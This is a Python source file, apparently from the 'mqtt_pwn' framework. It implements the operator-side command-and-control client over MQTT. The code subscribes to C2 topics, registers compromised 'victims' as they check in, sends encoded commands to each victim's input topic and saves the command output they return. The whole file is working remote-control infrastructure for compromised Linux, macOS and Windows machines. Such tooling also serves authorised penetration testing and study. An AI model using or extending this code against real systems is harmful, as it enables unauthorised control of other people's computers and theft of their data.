from paho.mqtt import client as mqtt

from mqtt_pwn import utils
from mqtt_pwn.config import DEFAULT_BROKER_HOST, DEFAULT_BROKER_PORT, DEFAULT_BROKER_USERNAME, DEFAULT_BROKER_PASSWORD, \
    C2_BASE_TOPIC
from mqtt_pwn.models.victim import Victim
from mqtt_pwn.models.command import Command
from mqtt_pwn.connection.system_info import SystemInfo
from mqtt_pwn.utils import new_victim_notification


class MqttClient(object):
    """ Represents a MQTT Client connection handler class"""

    def __init__(self, client_id=None, host=DEFAULT_BROKER_HOST, port=DEFAULT_BROKER_PORT, timeout=60, cli=None,
                 username=DEFAULT_BROKER_USERNAME, password=DEFAULT_BROKER_PASSWORD):
        """The class initializer"""

        self._mqtt_client = mqtt.Client(client_id)
        self.username = username
        self.password = password
        self.host = host
        self.port = port
        self.timeout = timeout
        self.cli = cli

        self.system_info = SystemInfo()

        self._base_topic = C2_BASE_TOPIC
        self._available_platforms = ('linux', 'darwin', 'windows')
        self._subscription_topics = [
            (f'{self._base_topic}/output/+', 0),
            (f'{self._base_topic}/register/+', 0),
            *SystemInfo.topics

        ]

        self.input_topic_fmt = self._base_topic + '/input/{uuid}'
        self._mqtt_client.on_message = self.mqtt_on_message
        self._mqtt_client.on_connect = self.mqtt_on_connect

    def publish(self, topic, payload):
        """Publishes a message to a victim"""

        encoded_payload = utils.encode(payload)
        self._mqtt_client.publish(topic=topic, payload=encoded_payload)

    def send_command(self, victim, command):
        """Sends a command to a victim"""

        self.publish(
            topic=self.input_topic_fmt.format(
                uuid=victim.uuid
            ),
            payload=command.to_payload_format()
        )

    def disconnect(self):
        self._mqtt_client.disconnect()

    def handle_failed_connection(self):
        self.cli.mqtt_client.disconnect()
        self.cli.mqtt_client = None
        self.cli.print_error('Connection failed!')

    def mqtt_on_connect(self, mqtt_client, userdata, flags, result):
        """A callback function that is responsible to being triggered when a connection was established"""

        if result == mqtt.MQTT_ERR_SUCCESS:
            self.cli.update_prompt()
        else:
            self.handle_failed_connection()

    def mqtt_on_message(self, mqtt_client, obj, msg):
        """Handles when a new message arrives"""

        if msg.topic in self.system_info.topic_list:
            self.system_info.update(msg.topic, msg.payload)
            return

        decoded_msg = utils.decode(msg.payload)

        if msg.topic.startswith(f'{self._base_topic}/register'):
            v = Victim.create_from_dict(decoded_msg)
            new_victim_notification(self.cli)

        if msg.topic.startswith(f'{self._base_topic}/output'):
            c = Command.select().where(Command.id == int(decoded_msg.get('command_id'))).first()

            if c is not None:
                c.output = decoded_msg.get('output')
                c.save()

    def stop(self):
        """Stops the mqtt connection loop"""

        self.disconnect()
        self._mqtt_client.loop_stop()

    def run(self):
        """Run the MQTT client"""

        if self.username and self.password: 
            self._mqtt_client.username_pw_set(self.username, self.password)

        self._mqtt_client.connect(self.host, self.port, self.timeout)
        self._mqtt_client.subscribe(self._subscription_topics)
        self._mqtt_client.loop_start()
